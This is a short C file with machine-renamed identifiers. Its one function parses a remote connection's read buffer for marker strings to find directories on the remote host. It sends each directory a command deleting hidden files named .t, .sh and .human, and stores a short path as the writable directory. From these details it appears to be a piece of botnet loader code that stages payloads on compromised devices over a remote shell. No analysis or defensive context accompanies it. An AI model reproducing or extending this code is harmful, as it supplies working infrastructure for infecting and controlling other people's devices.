#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  writedir; } ;
struct connection {int rdbuf_pos; TYPE_1__ info; int /*<<< orphan*/  fd; scalar_t__ rdbuf; } ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 scalar_t__ FALSE ; 
 char* TOKEN_RESPONSE ; 
 scalar_t__ TRUE ; 
 char* VERIFY_STRING_CHECK ; 
 int /*<<< orphan*/  FUNC0 (struct connection*) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ,char*) ; 
 int FUNC2 (char*) ; 
 char* FUNC3 (scalar_t__,char*) ; 
 int FUNC4 (scalar_t__,int,char*,int) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ,char*,char*,char*,char*) ; 

int FUNC6(struct connection *conn)
{
    int end_pos, i, offset, total_offset = 0;
    BOOL found_writeable = FALSE;

    if ((end_pos = FUNC4(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, FUNC2(TOKEN_RESPONSE))) == -1)
        return 0;

    while (TRUE)
    {
        char *pch;
        int pch_len;

        offset = FUNC4(conn->rdbuf + total_offset, end_pos - total_offset, VERIFY_STRING_CHECK, FUNC2(VERIFY_STRING_CHECK));
        if (offset == -1)
            break;
        total_offset += offset;

        pch = FUNC3(conn->rdbuf + total_offset, "\n");
        if (pch == NULL)
            continue;
        pch_len = FUNC2(pch);

        if (pch[pch_len - 1] == '\r')
            pch[pch_len - 1] = 0;

        FUNC5(conn->fd, "rm %s/.t; rm %s/.sh; rm %s/.human\r\n", pch, pch, pch);
        if (!found_writeable)
        {
            if (pch_len < 31)
            {
                FUNC1(conn->info.writedir, pch);
                found_writeable = TRUE;
            }
            else
                FUNC0(conn);
        }
    }

    return end_pos;
}